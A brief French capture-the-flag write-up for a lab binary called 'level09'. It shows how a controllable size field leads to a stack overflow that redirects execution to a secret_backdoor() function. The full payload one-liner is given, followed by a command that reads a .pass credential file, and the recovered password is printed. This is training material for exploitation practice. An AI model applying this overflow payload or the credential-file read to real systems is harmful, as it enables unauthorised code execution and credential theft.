# level09

On voit qu'avec `set_username()`, on peut écrire la `size` qui sera utilisé lors du `strncpy` dans `set_msg`.

Grâce à cela, dans `set_msg`, on pourra réecrire `rip`, et y mettre l'adresse de la fonction `secret_backdoor()`.

L'adresse de la fonction `secret_backdoor`:
```
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

Notre payload:
- Remplir username de "A", et mettre la size à `\xff`
- Remplir toute la structure jusque `rip`, et écrire l'adresse de `secret_backdoor`
- Utiliser la backdoor pour obtenir un shell
- Déguster le shell tant qu'il sort du four

```bash
(python2 -c 'print "A"*40 + "\xff"'; python2 -c 'print "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; echo "/bin/sh"; cat) | ./level09
```

```bash
cat /home/users/end/.pass
# j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
